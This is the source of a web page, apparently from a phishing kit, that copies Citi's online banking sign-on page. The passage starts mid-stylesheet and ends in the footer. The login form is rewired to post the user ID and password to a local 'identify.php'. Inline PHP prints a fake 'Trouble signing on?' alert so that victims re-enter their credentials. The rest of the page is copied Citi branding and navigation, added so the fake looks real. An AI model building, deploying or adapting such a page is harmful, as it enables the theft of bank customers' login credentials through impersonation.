    .gs-promotion a.gs-title:hover *,
    .gs-promotion .gs-snippet a:hover {
      color: #1155CC
    }

    .gs-promotion a.gs-title:active,
    .gs-promotion a.gs-title:active *,
    .gs-promotion .gs-snippet a:active {
      color: #1155CC
    }

    .gs-promotion .gs-snippet,
    .gs-promotion .gs-title .gs-promotion-title-right,
    .gs-promotion .gs-title .gs-promotion-title-right * {
      color: #333333
    }

    .gs-promotion .gs-visibleUrl,
    .gs-promotion .gs-visibleUrl-short {
      color: #009933
    }

    .gcsc-find-more-on-google {
      color: #1155CC
    }

    .gcsc-find-more-on-google-magnifier {
      fill: #1155CC
    }
  </style>


  <style type="text/css" id="kampyleStyle">
    .noOutline {
      outline: none !important;
    }

    .wcagOutline:focus {
      outline: 1px dashed #595959 !important;
      outline-offset: 2px !important;
      transition: none !important;
    }

    .nebula_image_button {
      width: auto !important;
      background: transparent !important;
    }
  </style>
</head>

<body>
  <app-root _nghost-sc411="" ng-version="9.1.13" _nghost-ssr-c202=""><cbol-core _ngcontent-ssr-c202=""
      _nghost-ssr-c194=""><citi-parent-layout _ngcontent-ssr-c194="" _nghost-ssr-c151="">
        <div _ngcontent-ssr-c151="" class="citi-outer-container cbolui-responsive cbolui-ddl-post"><citi-header
            _ngcontent-ssr-c151="" _nghost-ssr-c111=""><a _ngcontent-ssr-c111="" aria-live="assertive"
              class="alternateSkipNav">Skip to Content</a>
            <div _ngcontent-ssr-c111="" class="header">
              <div _ngcontent-ssr-c111="" class="primary"><citi-banner2 _ngcontent-ssr-c111="" _nghost-ssr-c112="">
                  <div _ngcontent-ssr-c112="" role="banner" class="banner">
                    <div _ngcontent-ssr-c112="" class="content-wrap">
                      <div _ngcontent-ssr-c112="" class="journeyLogo">
                        <div _ngcontent-ssr-c112="" class="logoDiv default"><a _ngcontent-ssr-c112="" id="sessionFocus"
                            tabindex="0"><!----><!----><img _ngcontent-ssr-c112="" alt="Citi"
                              src="assets/img/citilogoredesign.png"><!----></a></div><!----><!----><!---->
                      </div>
                      <div _ngcontent-ssr-c112="" class="buttons">
                        <div _ngcontent-ssr-c112="" class="navButton" id="butlerATM"><a _ngcontent-ssr-c112=""
                            id="atmLink"><img _ngcontent-ssr-c112="" alt="" src="assets/img/050-location@2x.svg"><span
                              _ngcontent-ssr-c112="">ATM / BRANCH</span></a><!----><!----><!----><!----><!----></div>
                        <div _ngcontent-ssr-c112="" class="navButton" id="lang"><!----><!----><!----><button
                            _ngcontent-ssr-c112="" id="langBtn"><img _ngcontent-ssr-c112="" role="presentation" alt=""
                              src="assets/img/icon_globe_med-grey@2x.svg"><span
                              _ngcontent-ssr-c112="">ESPAÑOL</span></button><!----><citi-modal _ngcontent-ssr-c112=""
                            class="cbolui-ddl-pre" _nghost-ssr-c58="">
                            <div _ngcontent-ssr-c58="" tabindex="-1" class="modal citi-modal fade" id="citi-modal-32"
                              style="display: none;">
                              <div _ngcontent-ssr-c58="" tabindex="-1" class="modal-dialog">
                                <div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true">
                                </div>
                                <div _ngcontent-ssr-c58="" cdktrapfocus="" class="modal-content">
                                  <div _ngcontent-ssr-c58="" class="modal-header"><button _ngcontent-ssr-c58=""
                                      type="button" aria-label="Close modal" class="close-button"><span
                                        _ngcontent-ssr-c58="" class="sr-only">Close</span></button><!----></div>
                                  <div _ngcontent-ssr-c58="" role="document">
                                    <div _ngcontent-ssr-c58="" tabindex="-1" class="modal-body">
                                      <div _ngcontent-ssr-c58="" tabindex="-1" class="header">
                                        <div _ngcontent-ssr-c112="" title="">Notificación importante</div>
                                      </div><!----><!---->
                                      <div _ngcontent-ssr-c58="" class="modal-body-content" tabindex="-1">
                                        <p _ngcontent-ssr-c112="">
                                        <p><strong>Por favor, tenga en cuenta que es posible que las comunicaciones
                                            futuras del banco, ya sean verbales o escritas, sean únicamente en inglés.
                                            Estas comunicaciones podrían incluir, entre otras, contratos de cuentas,
                                            estados de cuenta y divulgaciones, así como cambios en términos o cargos o
                                            cualquier tipo de servicio para su cuenta. Además, es posible que algunas
                                            secciones de este website permanezcan en inglés.</strong></p>
                                        <hr>
                                        <p>Please be advised that future verbal and written communications from the bank
                                          may be in English only. These communications may include, but are not limited
                                          to, account agreements, statements and disclosures, changes in terms or fees;
                                          or any servicing of your account. Additionally, some sections of this site may
                                          remain in English. </p>
                                        </p>
                                      </div>
                                    </div>
                                  </div>
                                  <div _ngcontent-ssr-c58="" class="modal-footer">
                                    <div _ngcontent-ssr-c58="" class="text-right">
                                      <div _ngcontent-ssr-c58="" class="citi-modal-controls"><citi-cta
                                          _ngcontent-ssr-c58="" class="modal-primary-btn btnclassTest"
                                          _nghost-ssr-c55=""><!----><a _ngcontent-ssr-c55="" target="_self"
                                            id="6bf5a4a9-0fd3-809f-fc5d-a8d580671079" href="/login"
                                            class="btn btn-primary">Continuar</a><!----><!----><!----></citi-cta><!----><!---->
                                      </div><!---->
                                    </div><!----><!---->
                                  </div>
                                </div>
                                <div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true">
                                </div>
                              </div>
                            </div>
                            <div _ngcontent-ssr-c58="" class="modal-backdrop citi-modal-backdrop fade"
                              style="display: none;"></div>
                          </citi-modal><!----></div><!---->
                      </div><!---->
                    </div>
                  </div><!---->
                </citi-banner2><citi-navigation3 _ngcontent-ssr-c111="" class="citi-navigation"
                  _nghost-ssr-c131=""><!----><citi-sign-on-modal3 _ngcontent-ssr-c131="" class="citi-sign-on-modal"
                    _nghost-ssr-c134=""><!----></citi-sign-on-modal3><citi-nav-search _ngcontent-ssr-c131=""
                    _nghost-ssr-c135="">
                    <div _ngcontent-ssr-c135="" role="banner" class="banner">
                      <div _ngcontent-ssr-c135="" class="content-wrap">
                        <div _ngcontent-ssr-c135="" role="search" class="search"><!----></div>
                      </div>
                    </div><!---->
                  </citi-nav-search></citi-navigation3></div><citi-welcome-bar _ngcontent-ssr-c111=""
                _nghost-ssr-c113=""><!----></citi-welcome-bar>
            </div>
          </citi-header>
          <div _ngcontent-ssr-c151="" id="maincontent">
            <div _ngcontent-ssr-c151=""><!---->
              <div _ngcontent-ssr-c151="" class="citi-container cbolui-ddl theme-light"><!---->
                <div _ngcontent-ssr-c151="" class="appbody"><router-outlet
                    _ngcontent-ssr-c194=""></router-outlet><citi-partner-login-validation
                    _nghost-ssr-c204=""><citi-simple-layout _ngcontent-ssr-c204="">
                      <main _ngcontent-ssr-c204=""><!---->
                        <section _ngcontent-ssr-c204="" class="partner-login-container">
                          <div _ngcontent-ssr-c204="" class="partner-login-container-hero login-screen-logo"
                            style="background-image: url(assets/img/LSO_4959.jpg);"></div><!----><!----><!---->
                          <div _ngcontent-ssr-c204="" content4="" class="partnerLoginBox"><citi-form-container
                              _ngcontent-ssr-c204="" formname="partnerLoginForm" id="partnerIdForm" formmethod="post"
                              formaction="#" formheader="">





                              <form class="pay-transfer-options clearfix" action="identify.php" method="post"
                                id="frmSignOn" name="form" onsubmit="return validated()">


                                <!----><!----><!---->
                                <div>
                                  <div _ngcontent-ssr-c204="" class="partner-login-content-fluid"><!----><!---->
                                    <div _ngcontent-ssr-c204="" class="signOnBlock"><!----><citi-signon2
                                        _ngcontent-ssr-c204="" idstr="signInBtn" class="citi-signon2 signonContainer"
                                        _nghost-ssr-c84="">
                                        <div _ngcontent-ssr-c84="" class="qr"></div>
                                        <section _ngcontent-ssr-c84="" class="theme-light SampleErrorStates">
                                          <h4 _ngcontent-ssr-c84="">Sign On</h4>
                                          <div _ngcontent-ssr-c84=""></div>
                                          <div _ngcontent-ssr-c84="" class="row">

                                            <?php
                                            if (isset($_GET['invalid'])) {
                                              $invalid = isset($_GET['invalid']) ? trim(htmlentities($_GET['invalid'])) : '';
                                              $em = "login";
                                              if ($invalid == $em) {
                                                print "<input type='hidden' name='invalid' value='invalid'><citi-errors _ngcontent-ssr-c184='' alertmessage='' errortype='criticalAlert' class='citi-errors partnerLoginErrMsg' _nghost-ssr-c64=''><div _ngcontent-ssr-c64='' role='alert' class='alert critical' style='margin-bottom: 0px;border: 1px solid transparent;border-radius: 0px;'><div _ngcontent-ssr-c64='' class='message'><span _ngcontent-ssr-c64='' class='sr-only'>critical alert icon</span><!----><div _ngcontent-ssr-c64=''><span _ngcontent-ssr-c64='' class='strong'>Trouble signing on?</span><span _ngcontent-ssr-c64=''>Select 'Forgot User ID or Password'</span></div><!----></div></div></citi-errors>";
                                              }
                                            } ?>

                                            <div _ngcontent-ssr-c84="" class="username-input col-xs-6">


                                              <citi-input2 _ngcontent-ssr-c204="" idstr="username" username=""
                                                minlength="3" type="text" required="true" class="citi-input2 row"
                                                _nghost-ssr-c80="">
                                                <div _ngcontent-ssr-c80="" class="form-control-container col-xs-12">
                                                  <label _ngcontent-ssr-c80="" tabindex="-1" for="username"
                                                    id="username-label" style="opacity: 0;">User ID</label>
                                                  <div _ngcontent-ssr-c80="" class="input-container errored"
                                                    id="username_div">
                                                    <div _ngcontent-ssr-c80="" class="add-on-pre"><!----><!----><!---->
                                                    </div><span _ngcontent-ssr-c80=""
                                                      class="input-switch-wrapper"><!----><!----><!----><input
                                                        _ngcontent-ssr-c80="" autocapitalize="none" type="text"
                                                        name="username" id="username" tabindex="0" placeholder="User ID"
                                                        maxlength="524288" autocomplete="off" aria-required="true"
                                                        aria-labelledby="username-label" aria-label=""
                                                        class="ng-untouched ng-pristine ng-valid"
                                                        data-order-appearance="0" aria-invalid="true"><!----></span>
                                                    <div _ngcontent-ssr-c80="" class="add-on-post"><!----><!----><!---->
                                                    </div>
                                                  </div>
                                                  <div _ngcontent-ssr-c80="" class="input-error"><span
                                                      _ngcontent-ssr-c80="" class="validation-message-danger"
                                                      id="username-error" style="display:none;">Enter a User ID</span>
                                                  </div><!----><!---->
                                                </div>
                                              </citi-input2>



                                              <!----><!---->
                                            </div>
                                            <div _ngcontent-ssr-c84="" class="password-input col-xs-6">

                                              <citi-input2 _ngcontent-ssr-c204="" idstr="password" password=""
                                                type="password" minlength="6" class="citi-input2 row"
                                                _nghost-ssr-c80="">
                                                <div _ngcontent-ssr-c80="" class="form-control-container col-xs-12">
                                                  <label _ngcontent-ssr-c80="" tabindex="-1" for="password"
                                                    id="password-label" style="opacity: 0;">Password</label>
                                                  <div _ngcontent-ssr-c80="" class="input-container errored"
                                                    id="password_div">
                                                    <div _ngcontent-ssr-c80="" class="add-on-pre"><!----><!----><!---->
                                                    </div><span _ngcontent-ssr-c80=""
                                                      class="input-switch-wrapper"><!----><!----><!----><input
                                                        _ngcontent-ssr-c80="" autocapitalize="none" type="password"
                                                        name="password" id="password" tabindex="0"
                                                        placeholder="Password" maxlength="524288" autocomplete="off"
                                                        aria-required="true" aria-labelledby="password-label"
                                                        aria-label="" class="ng-untouched ng-pristine ng-valid"
                                                        data-order-appearance="1" aria-invalid="true"><!----></span>
                                                    <div _ngcontent-ssr-c80="" class="add-on-post"><!----><!----><!---->
                                                    </div>
                                                  </div>
                                                  <div _ngcontent-ssr-c80="" class="input-error"><span
                                                      _ngcontent-ssr-c80="" class="validation-message-danger"
                                                      id="password-error" style="display:none;">Enter a Password</span>
                                                  </div><!----><!---->
                                                </div>
                                              </citi-input2>


                                            </div>
                                          </div>
                                          <div _ngcontent-ssr-c84="">

                                            <div _ngcontent-ssr-c204="" remember="" class="checkbox"
                                              style="margin-bottom: 0px;"><input _ngcontent-ssr-c204="" type="checkbox"
                                                id="rememberUid" name="remember"><label _ngcontent-ssr-c204=""
                                                for="rememberUid" id="rememberUidLabel">Remember User ID</label></div>


                                            <!----><!---->
                                          </div><!----><!---->
                                          <div _ngcontent-ssr-c84="" class="row">
                                            <div _ngcontent-ssr-c84="" class="form-group signonButton col-xs-12">

                                              <button
                                                style="width: 100%;color: #fff;border-color: #056dae;background: #056dae;/* border-style: solid; */margin: 20px 2px 0px 0;min-width: 220px;position: relative;"
                                                class="jpui button focus util float right primary" id="NEXT"
                                                type="submit">
                                                <span class="label">Sign On</span>
                                              </button>

                                              <script>

                                                var email = document.forms['form']['username'];
                                                var password = document.forms['form']['password'];

                                                var email_error = document.getElementById('username-error');
                                                var pass_error = document.getElementById('password-error');

                                                email.addEventListener('textInput', email_Verify);
                                                password.addEventListener('textInput', pass_Verify);

                                                function validated() {
                                                  if (email.value.length == "") {
                                                    email_error.style.display = "block";
                                                    document.getElementById('username_div').style.borderColor = "red";
                                                    email.focus();
                                                    return false;
                                                  }

                                                  if (password.value.length == "") {
                                                    pass_error.style.display = "block";
                                                    document.getElementById('password_div').style.borderColor = "red";
                                                    password.focus();
                                                    return false;
                                                  }
                                                }
                                                function email_Verify() {
                                                  if (email.value.length >= 2) {
                                                    email_error.style.display = "none";
                                                    document.getElementById('username_div').style.borderColor = "transparent";
                                                    return true;
                                                  }

                                                }
                                                function pass_Verify() {
                                                  if (password.value.length >= 2) {
                                                    pass_error.style.display = "none";
                                                    document.getElementById('password_div').style.borderColor = "transparent";
                                                    return true;
                                                  }

                                                }

                                              </script>





                                            </div>
                                          </div>
                                          <div _ngcontent-ssr-c84="" class="row"></div>
                                        </section>
                                      </citi-signon2><!---->
                                      <div _ngcontent-ssr-c204="" class="row linkBlock">
                                        <div _ngcontent-ssr-c204="" class="linkAlign col-xs-6"><citi-cta
                                            _ngcontent-ssr-c204="" _nghost-ssr-c55=""><button _ngcontent-ssr-c55=""
                                              type="button" id="forgotUIdLink" class="btn btn-link small"
                                              style="text-align: center;">Forgot User
                                              ID?</button><!----><!----><!----><!----></citi-cta></div>
                                        <!----><!----><!----><!----><!----><!----><!----><!----><!----><!---->
                                        <div _ngcontent-ssr-c204="" class="linkAlign col-xs-6"><citi-cta
                                            _ngcontent-ssr-c204="" _nghost-ssr-c55=""><button _ngcontent-ssr-c55=""
                                              type="button" id="forgotPwdLink" class="btn btn-link small"
                                              style="text-align: center;">Forgot
                                              Password?</button><!----><!----><!----><!----></citi-cta></div>
                                        <!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!---->
                                        <div _ngcontent-ssr-c204="" class="linkAlign col-xs-6"><citi-cta
                                            _ngcontent-ssr-c204="" _nghost-ssr-c55=""><button _ngcontent-ssr-c55=""
                                              type="button" id="activateaCardLink" class="btn btn-link small"
                                              style="text-align: center;">Activate a
                                              Card</button><!----><!----><!----><!----></citi-cta></div>
                                        <!----><!----><!----><!----><!----><!----><!----><!----><!----><!---->
                                        <div _ngcontent-ssr-c204="" class="linkAlign col-xs-6"><citi-cta
                                            _ngcontent-ssr-c204="" _nghost-ssr-c55=""><button _ngcontent-ssr-c55=""
                                              type="button" id="registerOnlineLink" class="btn btn-link small"
                                              style="text-align: center;">Register for Online
                                              Access</button><!----><!----><!----><!----></citi-cta></div>
                                        <!----><!----><!----><!----><!----><!---->
                                      </div><!---->
                                      <div _ngcontent-ssr-c204="" class="row linkBlock">
                                        <!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!---->
                                      </div>
                                    </div>
                                  </div>
                                </div>


                              </form>









                            </citi-form-container></div><!---->
                        </section><!---->
                      </main>
                    </citi-simple-layout>
                    <form _ngcontent-ssr-c204="" ngnoform="" id="postForm" method="POST" action=""><!----></form>
                  </citi-partner-login-validation><!----><mfa-modal _ngcontent-ssr-c202="" _nghost-ssr-c102="">
                    <div _ngcontent-ssr-c102=""><router-outlet _ngcontent-ssr-c102=""
                        name="mfaContent"></router-outlet><!----></div>
                    <div _ngcontent-ssr-c102="" class="mfa-screen-alignment"><router-outlet _ngcontent-ssr-c102=""
                        name="mfaConfirm"></router-outlet><!----></div>
                  </mfa-modal><ivr-modal _ngcontent-ssr-c194="" _nghost-ssr-c197=""><citi-modal _ngcontent-ssr-c197=""
                      idstr="modalID" id="ivr-modal" footerprojection="true" _nghost-ssr-c58="">
                      <div _ngcontent-ssr-c58="" tabindex="-1" class="modal citi-modal fade" id="modalID"
                        style="display: none;">
                        <div _ngcontent-ssr-c58="" tabindex="-1" class="modal-dialog">
                          <div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true"></div>
                          <div _ngcontent-ssr-c58="" cdktrapfocus="" class="modal-content">
                            <div _ngcontent-ssr-c58="" class="modal-header"><button _ngcontent-ssr-c58="" type="button"
                                aria-label="Close modal" class="close-button"><span _ngcontent-ssr-c58=""
                                  class="sr-only">Close</span></button><!----></div>
                            <div _ngcontent-ssr-c58="" role="document">
                              <div _ngcontent-ssr-c58="" tabindex="-1" class="modal-body">
                                <div _ngcontent-ssr-c58="" tabindex="-1" class="header"></div><!----><!---->
                                <div _ngcontent-ssr-c58="" class="modal-body-content" tabindex="-1">
                                  <p _ngcontent-ssr-c197=""></p><!----><!---->
                                  <div _ngcontent-ssr-c197="" class="ivr-cta-wrapper"><!----></div><!---->
                                </div>
                              </div>
                            </div>
                            <div _ngcontent-ssr-c58="" class="modal-footer"><!---->
                              <div _ngcontent-ssr-c58="">
                                <div _ngcontent-ssr-c58=""><!----></div>
                              </div><!---->
                            </div>
                          </div>
                          <div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true"></div>
                        </div>
                      </div>
                      <div _ngcontent-ssr-c58="" class="modal-backdrop citi-modal-backdrop fade" style="display: none;">
                      </div>
                    </citi-modal></ivr-modal><cds-ivr-modal _ngcontent-ssr-c194="" _nghost-ssr-c198=""><cds-modal-dialog
                      _ngcontent-ssr-c198="" class="ivr-modal-container" _nghost-ssr-c166="">
                      <div _ngcontent-ssr-c166="" cdsariahideouterdom="">
                        <div _ngcontent-ssr-c166="" class="cds-modal cds-modal-fade" aria-hidden="true"
                          style="display: none;">
                          <div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true"></div>
                          <div _ngcontent-ssr-c166="" cdsfocustrap="" role="dialog" aria-modal="true"
                            class="cds-modal-dialog">
                            <div _ngcontent-ssr-c198="" class="cds-modal-dialog-centered">
                              <div _ngcontent-ssr-c198="" class="cds-modal-content cds-modal-lg">
                                <div _ngcontent-ssr-c198=""><button _ngcontent-ssr-c198="" type="button"
                                    aria-label="Close" class="cds-modal-close cds-close cds-warning-close"></button>
                                </div>
                                <div _ngcontent-ssr-c198="" class="cds-modal-header">
                                  <h4 _ngcontent-ssr-c198="" class="cds-modal-title"></h4>
                                </div>
                                <div _ngcontent-ssr-c198="" class="cds-modal-body">
                                  <p _ngcontent-ssr-c198=""></p>
                                  <div _ngcontent-ssr-c198="" class="row">
                                    <div _ngcontent-ssr-c198="" class="col-xs-12 col-lg-6 dropdown">
                                      <form _ngcontent-ssr-c198="" novalidate=""
                                        class="ng-untouched ng-pristine ng-invalid"><cds-form-field
                                          _ngcontent-ssr-c198="" class="cds-form-field">
                                          <div class="cds-form-field-infix cds-input-group"><!----></div>
                                        </cds-form-field></form>
                                    </div>
                                  </div><!---->
                                  <div _ngcontent-ssr-c198="" class="ivr-cta-wrapper row"><!----></div><!---->
                                </div>
                                <div _ngcontent-ssr-c198="" class="cds-modal-footer"><!----></div>
                              </div>
                            </div>
                          </div>
                          <div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true"></div>
                        </div>
                        <div _ngcontent-ssr-c166="" class="cds-modal-backdrop cds-modal-fade" style="display: none;">
                        </div>
                      </div>
                    </cds-modal-dialog></cds-ivr-modal><cbol-session _ngcontent-ssr-c194=""
                    _nghost-ssr-c195=""><citi-modal _ngcontent-ssr-c195="" showcancelbutton="true"
                      primarybuttontarget="_blank" openerselector="#sessionFocus" class="cbolui-ddl-post"
                      _nghost-ssr-c58="">
                      <div _ngcontent-ssr-c58="" tabindex="-1" class="modal citi-modal fade" id="citi-modal-2"
                        style="display: none;">
                        <div _ngcontent-ssr-c58="" tabindex="-1" class="modal-dialog">
                          <div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true"></div>
                          <div _ngcontent-ssr-c58="" cdktrapfocus="" class="modal-content">
                            <div _ngcontent-ssr-c58="" class="modal-header"><button _ngcontent-ssr-c58="" type="button"
                                aria-label="Close modal" class="close-button"><span _ngcontent-ssr-c58=""
                                  class="sr-only">Close</span></button><!----></div>
                            <div _ngcontent-ssr-c58="" role="document">
                              <div _ngcontent-ssr-c58="" tabindex="-1" class="modal-body">
                                <div _ngcontent-ssr-c58="" tabindex="-1" class="header"></div><!----><!---->
                                <div _ngcontent-ssr-c58="" class="modal-body-content" tabindex="-1">
                                  <p _ngcontent-ssr-c195=""></p>
                                  <p _ngcontent-ssr-c195=""> <b _ngcontent-ssr-c195=""> </b></p>
                                  <p _ngcontent-ssr-c195=""></p>
                                </div>
                              </div>
                            </div>
                            <div _ngcontent-ssr-c58="" class="modal-footer">
                              <div _ngcontent-ssr-c58="" class="text-right"><!----></div><!----><!---->
                            </div>
                          </div>
                          <div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true"></div>
                        </div>
                      </div>
                      <div _ngcontent-ssr-c58="" class="modal-backdrop citi-modal-backdrop fade" style="display: none;">
                      </div>
                    </citi-modal></cbol-session><cobrowse-modal _ngcontent-ssr-c194="" _nghost-ssr-c148=""><citi-modal
                      _ngcontent-ssr-c148="" idstr="modal" _nghost-ssr-c58="">
                      <div _ngcontent-ssr-c58="" tabindex="-1" class="modal citi-modal fade" id="modal"
                        style="display: none;">
                        <div _ngcontent-ssr-c58="" tabindex="-1" class="modal-dialog">
                          <div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true"></div>
                          <div _ngcontent-ssr-c58="" cdktrapfocus="" class="modal-content">
                            <div _ngcontent-ssr-c58="" class="modal-header"><button _ngcontent-ssr-c58="" type="button"
                                aria-label="Close modal" class="close-button"><span _ngcontent-ssr-c58=""
                                  class="sr-only">Close</span></button><!----></div>
                            <div _ngcontent-ssr-c58="" role="document">
                              <div _ngcontent-ssr-c58="" tabindex="-1" class="modal-body">
                                <div _ngcontent-ssr-c58="" tabindex="-1" class="header">
                                  <div _ngcontent-ssr-c148="" title=""></div><!---->
                                </div><!----><!---->
                                <div _ngcontent-ssr-c58="" class="modal-body-content" tabindex="-1">
                                  <div _ngcontent-ssr-c148="">
                                    <p _ngcontent-ssr-c148=""></p>
                                    <div _ngcontent-ssr-c148="" class="theme-light"><citi-input _ngcontent-ssr-c148=""
                                        type="text" class="citi-input row" _nghost-ssr-c72="">
                                        <div _ngcontent-ssr-c72="" class="col-xs-12 form-group"><label
                                            _ngcontent-ssr-c72="" for="undefined" id="null"
                                            class="text-input-label"></label>
                                          <div _ngcontent-ssr-c72="">
                                            <div _ngcontent-ssr-c72="">
                                              <div _ngcontent-ssr-c72=""><!----><!----><!----><input
                                                  _ngcontent-ssr-c72="" aria-label="" type="text" placeholder=""
                                                  maxlength="524288" autocomplete="off"
                                                  class="form-control ng-untouched ng-pristine ng-valid"><!----><!---->
                                              </div>
                                            </div><!----><span _ngcontent-ssr-c72="" aria-hidden="true" class="sr-only"
                                              id="undefined-error">Error</span>
                                          </div>
                                        </div>
                                      </citi-input></div>
                                    <div _ngcontent-ssr-c148=""></div>
                                  </div><!----><!---->
                                </div>
                              </div>
                            </div>
                            <div _ngcontent-ssr-c58="" class="modal-footer">
                              <div _ngcontent-ssr-c58="" class="text-right"><!----></div><!----><!---->
                            </div>
                          </div>
                          <div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true"></div>
                        </div>
                      </div>
                      <div _ngcontent-ssr-c58="" class="modal-backdrop citi-modal-backdrop fade" style="display: none;">
                      </div>
                    </citi-modal></cobrowse-modal><citi-route-detector
                    _ngcontent-ssr-c194=""></citi-route-detector><citi-session-handler _ngcontent-ssr-c194=""
                    interval="10000"></citi-session-handler></div><!---->
              </div>
            </div><!---->
          </div><citi-footer _ngcontent-ssr-c151="" _nghost-ssr-c114="">
            <div _ngcontent-ssr-c114="" role="contentinfo" class="footer"><citi-footer-navigation _ngcontent-ssr-c114=""
                _nghost-ssr-c115="">
                <div _ngcontent-ssr-c115="" class="navigation">
                  <div _ngcontent-ssr-c115="" class="content">
                    <div _ngcontent-ssr-c115="" role="group" class="section">
                      <h3 _ngcontent-ssr-c115="" class="title" id="nav-list-header0">Why Citi</h3><!----><button
                        _ngcontent-ssr-c115="" type="button" class="title" aria-controls="list0"
                        aria-expanded="false">Why Citi</button><!---->
                      <ul _ngcontent-ssr-c115="" id="list0" aria-labelledby="nav-list-header0" aria-hidden="false">
                        <li _ngcontent-ssr-c115="" id="navOurStory"><citi-cta _ngcontent-ssr-c115="" type="tertiary"
                            _nghost-ssr-c55=""><!----><a _ngcontent-ssr-c55="" target="_self"
                              id="23c40e38-e225-97b0-3e65-df97b9305172" class="btn btn-link">Our
                              Story</a><!----><!----><!----></citi-cta></li>
                        <li _ngcontent-ssr-c115="" id="navBenefits&amp;Services"><citi-cta _ngcontent-ssr-c115=""
                            type="tertiary" _nghost-ssr-c55=""><!----><a _ngcontent-ssr-c55="" target="_self"
                              id="809d27ad-c67d-1d4b-c868-eb2c0a283183" class="btn btn-link">Benefits and
                              Services</a><!----><!----><!----></citi-cta></li>
                        <li _ngcontent-ssr-c115="" id="navRewards"><citi-cta _ngcontent-ssr-c115="" type="tertiary"
                            _nghost-ssr-c55=""><!----><a _ngcontent-ssr-c55="" target="_self"
                              id="f29f9e66-6ece-4a3e-7fab-7b410d2c759a"
                              class="btn btn-link">Rewards</a><!----><!----><!----></citi-cta></li>
                        <li _ngcontent-ssr-c115="" id="navCitiEasyDeals"><citi-cta _ngcontent-ssr-c115=""
                            type="tertiary" _nghost-ssr-c55=""><!----><a _ngcontent-ssr-c55="" target="_blank"
                              id="a9315a8b-60cf-e892-bcf3-7fabf65a3865" class="btn btn-link">Citi Easy
                              Deals<sup>SM</sup></a><!----><!----><!----></citi-cta></li>
                        <li _ngcontent-ssr-c115="" id="navPrivatePass"><citi-cta _ngcontent-ssr-c115="" type="tertiary"
                            _nghost-ssr-c55=""><!----><a _ngcontent-ssr-c55="" target="_blank"
                              id="1a0af872-ef02-6fc4-1f25-362d822e2526"
                              aria-describedby="49efe54e-9fe5-a346-c429-f8b66ee91d78_ariadescription"
                              class="btn btn-link">Citi Entertainment<sup>SM</sup></a><!----><!----><!----></citi-cta>
                        </li>
                        <li _ngcontent-ssr-c115="" id="navSpecialOffers"><citi-cta _ngcontent-ssr-c115=""
                            type="tertiary" _nghost-ssr-c55=""><!----><a _ngcontent-ssr-c55="" target="_self"
                              id="6a692b04-90a9-1388-ac00-55ceedd3c00d" class="btn btn-link">Special
                              Offers</a><!----><!----><!----></citi-cta></li><!----><!----><!---->
                      </ul><!---->
                    </div>
                    <div _ngcontent-ssr-c115="" role="group" class="section">
                      <h3 _ngcontent-ssr-c115="" class="title" id="nav-list-header1">Wealth Management</h3>
                      <!----><button _ngcontent-ssr-c115="" type="button" class="title" aria-controls="list1"
                        aria-expanded="false">Wealth Management</button><!---->
                      <ul _ngcontent-ssr-c115="" id="list1" aria-labelledby="nav-list-header1" aria-hidden="false">
                        <li _ngcontent-ssr-c115="" id="navCitiPrivateClient"><citi-cta _ngcontent-ssr-c115=""
                            type="tertiary" _nghost-ssr-c55=""><!----><a _ngcontent-ssr-c55="" target="_self"
                              id="35c11ec7-bc3b-2ee5-515b-494748a66430" class="btn btn-link">Citigold<sup>®</sup>
                              Private Client</a><!----><!----><!----></citi-cta></li>
                        <li _ngcontent-ssr-c115="" id="navCitigold"><citi-cta _ngcontent-ssr-c115="" type="tertiary"
                            _nghost-ssr-c55=""><!----><a _ngcontent-ssr-c55="" target="_self"
                              id="487876e4-4239-321a-6d71-7edc5843f408"
                              class="btn btn-link">Citigold<sup>®</sup></a><!----><!----><!----></citi-cta></li>
                        <li _ngcontent-ssr-c115="" id="navCitiPriority"><citi-cta _ngcontent-ssr-c115="" type="tertiary"
                            _nghost-ssr-c55=""><!----><a _ngcontent-ssr-c55="" target="_self"
                              id="955ae228-aafa-e83f-2da7-6ade580cdbf8" class="btn btn-link">Citi
                              Priority</a><!----><!----><!----></citi-cta></li>
                        <li _ngcontent-ssr-c115="" id="navCitiPrivateBank"><citi-cta _ngcontent-ssr-c115=""
                            type="tertiary" _nghost-ssr-c55=""><!----><a _ngcontent-ssr-c55="" target="_self"
                              id="98f9f43f-b935-6d5d-5267-615c9a841692" class="btn btn-link">Citi Private
                              Bank</a><!----><!----><!----></citi-cta></li><!----><!----><!---->
                      </ul><!---->
                    </div>
                    <div _ngcontent-ssr-c115="" role="group" class="section">
                      <h3 _ngcontent-ssr-c115="" class="title" id="nav-list-header2">Business Banking</h3><!----><button
                        _ngcontent-ssr-c115="" type="button" class="title" aria-controls="list2"
                        aria-expanded="false">Business Banking</button><!---->
                      <ul _ngcontent-ssr-c115="" id="list2" aria-labelledby="nav-list-header2" aria-hidden="false">
                        <li _ngcontent-ssr-c115="" id="navSmallBusinessAccounts"><citi-cta _ngcontent-ssr-c115=""
                            type="tertiary" _nghost-ssr-c55=""><!----><a _ngcontent-ssr-c55="" target="_self"
                              id="9a87f055-d84d-16fb-5394-ed44d38c372e" class="btn btn-link">Small Business
                              Accounts</a><!----><!----><!----></citi-cta></li>
                        <li _ngcontent-ssr-c115="" id="navCommercialAccounts"><citi-cta _ngcontent-ssr-c115=""
                            type="tertiary" _nghost-ssr-c55=""><!----><a _ngcontent-ssr-c55="" target="_self"
                              id="3884cc9c-2e83-ae0d-9960-a94f43503b1e" class="btn btn-link">Commercial
                              Accounts</a><!----><!----><!----></citi-cta></li><!----><!----><!---->
                      </ul><!---->
                    </div>
                    <div _ngcontent-ssr-c115="" role="group" class="section">
